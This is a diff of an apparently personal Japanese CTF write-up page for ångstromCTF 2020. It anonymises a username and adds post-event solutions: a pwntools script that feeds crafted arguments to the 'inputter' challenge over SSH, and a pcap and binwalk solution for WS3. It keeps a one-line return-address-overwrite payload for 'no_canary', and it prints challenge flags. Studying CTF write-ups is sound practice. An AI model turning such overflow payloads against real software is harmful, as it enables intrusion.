@@ -43,18 +43,18 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://captureamerica.github.io/writeups/post/angstromctf_2020/" />
 <meta property="article:published_time" content="2020-03-19T10:00:00+09:00" />
-<meta property="article:modified_time" content="2020-03-19T10:00:00+09:00" />
+<meta property="article:modified_time" content="2020-03-20T09:00:00+09:00" />
 <meta itemprop="name" content="ångstromCTF 2020 Writeup | フラxxグゲット">
 <meta itemprop="description" content="URL: https://2020.angstromctf.com/challenges 5日間のCTFでした。主に、初日の土曜日に頑張りました。 高校生によって作られたCTFのようですね。素晴らしいです。 ちなみに、過去のチャレ">
 
 
 <meta itemprop="datePublished" content="2020-03-19T10:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2020-03-19T10:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="2740">
+<meta itemprop="dateModified" content="2020-03-20T09:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="3292">
 
 
 
-<meta itemprop="keywords" content="CTF," />
+<meta itemprop="keywords" content="CTF,Reviewed," />
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="ångstromCTF 2020 Writeup | フラxxグゲット"/>
 <meta name="twitter:description" content="URL: https://2020.angstromctf.com/challenges 5日間のCTFでした。主に、初日の土曜日に頑張りました。 高校生によって作られたCTFのようですね。素晴らしいです。 ちなみに、過去のチャレ"/>
@@ -181,6 +181,11 @@
 <ul>
 <li><a href="#challenge-7">Challenge</a></li>
 <li><a href="#unsolved-2">(Unsolved)</a></li>
+</ul></li>
+<li><a href="#misc-ws3-180-points">[Misc]: WS3 (180 points)</a>
+<ul>
+<li><a href="#challenge-8">Challenge</a></li>
+<li><a href="#solution-5">Solution</a></li>
 </ul></li>
 </ul></li>
 </ul>
@@ -475,7 +480,7 @@ Flag: <code>actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}</code></p>
 </span><span class="lnt">20
 </span></pre></td>
 <td class="lntd">
-<pre class="chroma">team5543@actf:/problems/2020/no_canary$ (python -c &#34;print(&#39;a&#39;*32+&#39;a&#39;*8+&#39;\x86\x11\x40\x00\x00\x00\x00\x00&#39;)&#34;; cat -) | ./no_canary
+<pre class="chroma">xxxxx@actf:/problems/2020/no_canary$ (python -c &#34;print(&#39;a&#39;*32+&#39;a&#39;*8+&#39;\x86\x11\x40\x00\x00\x00\x00\x00&#39;)&#34;; cat -) | ./no_canary
 Ahhhh, what a beautiful morning on the farm!
 
        _.-^-._    .--.
@@ -818,7 +823,7 @@ Flag: <code>actf{youre_a_canary_killer_&gt;:(}</code></p>
 </span><span class="lnt">7
 </span></pre></td>
 <td class="lntd">
-<pre class="chroma">team5543@actf:/problems/2020/taking_off$ ./taking_off 3 9 2 chicken
+<pre class="chroma">xxxxx@actf:/problems/2020/taking_off$ ./taking_off 3 9 2 chicken
 So you figured out how to provide input and command line arguments.
 But can you figure out what input to provide?
 Well, you found the arguments, but what&#39;s the password?
@@ -926,6 +931,8 @@ Hint: There are ways to run programs without using the shell.</p>
 <p>Attachment:</p>
 
 <ul>
+<li>inputter (ELF 64bit)</li>
+
 <li><p>inputter.c</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1026,6 +1033,67 @@ Hint: There are ways to run programs without using the shell.</p>
 <p>ちょっとヒントの意味もわからなかったです。意外と難しいもんですね。後日、復習しておきます。</p>
 
 <p><br /><br />
+2020/03/20 - 復習しました。</p>
+
+<p>なんか、pwntoolsで普通にできたみたいです。イベント中にやったときは、なぜかできなかった気がしたんですけど。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">if</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">user</span><span class="o">=</span><span class="s1">&#39;xxxxx&#39;</span>
+    <span class="n">pw</span><span class="o">=</span><span class="s1">&#39;yyyyy&#39;</span>
+    <span class="n">s</span><span class="o">=</span><span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;shell.actf.co&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">pw</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="s1">&#39;/problems/2020/inputter&#39;</span><span class="p">)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s2">&#34;./inputter&#34;</span><span class="p">,</span><span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#39;</span><span class="se">\&#34;\x07</span><span class="s2">&#34;</span><span class="p">])</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">&#34;./inputter&#34;</span><span class="p">,</span><span class="s2">&#34; </span><span class="se">\n</span><span class="s2">&#39;</span><span class="se">\&#34;\x07</span><span class="s2">&#34;</span><span class="p">])</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00\x01\x02\x03\n</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">msg</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br>
+<pre>
+captureamerica@kali:~/CTF/angstromCTF_2020$ ./inputter_solve.py
+[+] Connecting to shell.actf.co on port 22: Done
+[<em>] xxxxx@shell.actf.co:
+    Distro    Ubuntu 16.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.4.0
+    ASLR:     Enabled
+[</em>] Working directory: '/problems/2020/inputter'
+[+] Starting remote process './inputter' on shell.actf.co: pid 21500
+[+] Receiving all data: Done (94B)
+[*] Stopped remote process 'inputter' on shell.actf.co (pid 21500)
+You seem to know what you're doing.
+actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}
+</pre></p>
+
+<p><br>
+Flag: <code>actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}</code></p>
+
+<p><br /><br />
 <br /><br /></p>
 
 <h2 id="misc-all-these-rules-points">[Misc]: All These Rules (?? points)</h2>
@@ -1052,6 +1120,76 @@ ssh chall@misc.2020.chall.actf.co
 <p>これは解きたかったなぁ。（というか、解けないやつだったかもだけど。）</p>
 
 <p><br /><br />
+<br /><br />
+<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
+<br />
+ここから下はCTF終了後（2020/03/20）に行った復習です。他の方のWriteupとか参照してます。</p>
+
+<p><br /><br />
+<br /><br /></p>
+
+<h2 id="misc-ws3-180-points">[Misc]: WS3 (180 points)</h2>
+
+<hr />
+
+<h3 id="challenge-8">Challenge</h3>
+
+<blockquote>
+<p>What the... record.pcapng</p>
+</blockquote>
+
+<p>Attachment:</p>
+
+<ul>
+<li>record.pcapng</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="solution-5">Solution</h3>
+
+<p>git-receive-pack というのが出てきて、よく知らなかったのでスルーしたやつなんですが、gitを使わずとも解ける問題だったみたいなので再度やってみました。</p>
+
+<p>HTTP のオブジェクトをExportします。いくつかありますが、サイズが他と比べて特別大きい18KBのやつを狙います。</p>
+
+<p><img src="https://captureamerica.github.io/writeups/img/angstromctf_ws3.png" alt="angstromctf_ws3.png"></p>
+
+<p><br>
+binwalkします。</p>
+
+<pre>
+captureamerica@kali:~/Downloads$ binwalk --dd='.*' git-receive-pack 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+183           0xB7            Zlib compressed data, default compression
+342           0x156           Zlib compressed data, default compression
+425           0x1A9           Zlib compressed data, default compression
+</pre>
+
+<p><br>
+ここで、zlib-flateを使って解凍してもいいんですが、extractedの中にすでに解凍されたものも生成されてます。</p>
+
+<pre>
+captureamerica@kali:~/Downloads/_git-receive-pack.extracted$ file *
+156:                 data
+156.zlib:            zlib compressed data
+1A9:                 JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, baseline, precision 8, 413x549, components 3
+1A9.zlib:            zlib compressed data
+angstromctf_1A9.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, baseline, precision 8, 413x549, components 3
+B7:                  Git tree 87872
+B7.zlib:             zlib compressed data
+</pre>
+
+<p><br>
+1A9はJpegファイルで、開くとフラグが見つかります。</p>
+
+<p><img src="https://captureamerica.github.io/writeups/img/angstromctf_1A9.jpg" alt="angstromctf_1A9.jpg"></p>
+
+<p><br>
+Flag: <code>actf{git_good_git_wireshark-123323}</code></p>
+
+<p><br /><br />
 <br /><br /></p>
 
 <hr />
@@ -1069,7 +1207,7 @@ ssh chall@misc.2020.chall.actf.co
   <p class="copyright-item">
     <span class="item-title">LastMod</span>
     <span class="item-content">
-        2020-03-19
+        2020-03-20
         
     </span>
   </p>
@@ -1079,6 +1217,7 @@ ssh chall@misc.2020.chall.actf.co
 <footer class="post-footer">
       <div class="post-tags">
           <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          <a href="https://captureamerica.github.io/writeups/tags/reviewed/">Reviewed</a>
           </div>
       <nav class="post-nav">
         
